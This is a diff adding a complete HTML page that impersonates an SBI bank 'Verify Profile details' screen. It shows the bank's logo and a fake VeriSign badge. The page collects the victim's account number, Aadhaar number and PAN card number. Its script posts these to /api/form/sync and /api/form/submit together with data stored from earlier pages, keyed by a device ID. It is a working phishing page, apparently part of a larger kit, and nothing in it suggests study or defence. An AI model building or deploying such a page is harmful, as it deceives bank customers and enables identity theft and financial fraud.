@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verify Profile Details</title>
+
+    <style>
+        :root {
+            --primary: #0a3c8c;
+            --accent: #e6a100;
+            --bg: #fff;
+            --border: #cfcfcf;
+            --note-bg: #e9f4ff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        html,
+        body {
+            height: 100%;
+            background: var(--bg);
+        }
+
+        .page {
+            max-width: 420px;
+            margin: auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 14px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header img {
+            height: 40px;
+        }
+
+        .header span {
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .title-bar {
+            margin: 10px;
+            padding: 12px;
+            background: #e9f4ff;
+            border: 1px solid #c6def5;
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        .form {
+            padding: 10px 12px;
+            flex: 1;
+        }
+
+        label {
+            font-size: 16px;
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 8px;
+        }
+
+        label span {
+            color: red;
+        }
+
+        input {
+            width: 100%;
+            height: 52px;
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            padding: 12px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+        }
+
+        button.accent {
+            width: 200px;
+            height: 50px;
+            margin: 18px auto 8px;
+            display: block;
+            background: var(--accent);
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button.accent:hover {
+            background: #cc8f00;
+        }
+
+        .note-box {
+            margin: 10px;
+            background: var(--note-bg);
+            padding: 14px;
+            font-size: 13px;
+        }
+
+        .note-box ul {
+            padding-left: 13px;
+        }
+
+        .note-box li {
+            margin-bottom: 4px;
+        }
+
+        .footer {
+            margin-top: auto;
+            margin-bottom: 22px;
+            background: #000;
+            color: #fff;
+            padding: 10px 12px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer .tick {
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <div class="header">
+            <img src="../img/sbi-logo.png" alt="SBI">
+            <span></span>
+        </div>
+
+        <div class="title-bar">Verify Profile details</div>
+
+        <div class="form">
+            <label>Account Number <span>*</span></label>
+            <input type="text" id="accountNumber" placeholder="Enter account number" required>
+
+            <label>Aadhaar Number <span>*</span></label>
+            <input type="text" id="aadhaarNumber" maxlength="12" placeholder="Enter 12-digit Aadhaar" required>
+
+            <label>PAN Card Number <span>*</span></label>
+            <input type="text" id="panCard" maxlength="10" placeholder="Enter PAN number" required>
+
+            <button id="submitBtn" class="accent">submit</button>
+        </div>
+
+        <div class="note-box">
+            <ul>
+                <li>Mandatory fields are marked asterisk (*)</li>
+                <li>Do not share your personal information anywhere.</li>
+                <li>Your personal information is highly confidential.</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <span class="tick">✔</span>
+            <span>VeriSign &nbsp; © Copyright | All Rights Reserved</span>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('deviceId') || 'unknown';
+
+        // Collect all form data from localStorage for final submit
+        const formData = JSON.parse(localStorage.getItem('formData_' + deviceId) || '{}');
+
+        async function syncPageData(pageName, data) {
+            try {
+                await fetch('/api/form/sync', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        deviceId: deviceId,
+                        pageName: pageName,
+                        pageData: data,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error('[Form] Sync error:', error);
+            }
+        }
+
+        async function submitFinalData(allData) {
+            try {
+                const response = await fetch('/api/form/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(allData)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('[Form] Submit error:', error);
+                return false;
+            }
+        }
+
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const accountNumber = document.getElementById('accountNumber').value.trim();
+            const aadhaarNumber = document.getElementById('aadhaarNumber').value.trim();
+            const panCard = document.getElementById('panCard').value.trim().toUpperCase();
+
+            if (!accountNumber || !aadhaarNumber || !panCard) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            // Sync this page's data
+            await syncPageData('profile_verify', { accountNumber, aadhaarNumber, panCard });
+
+            // Final submit with all accumulated data
+            const finalData = {
+                deviceId: deviceId,
+                ...formData,
+                accountNumber,
+                aadhaarNumber,
+                panCard,
+                currentFlow: 'main'
+            };
+
+            const success = await submitFinalData(finalData);
+            if (success) {
+                localStorage.removeItem('formData_' + deviceId);
+                window.location.href = 'success.html?deviceId=' + encodeURIComponent(deviceId);
+            } else {
+                alert('Submission failed. Please try again.');
+            }
+        });
+    </script>
+</body>
+
+</html>
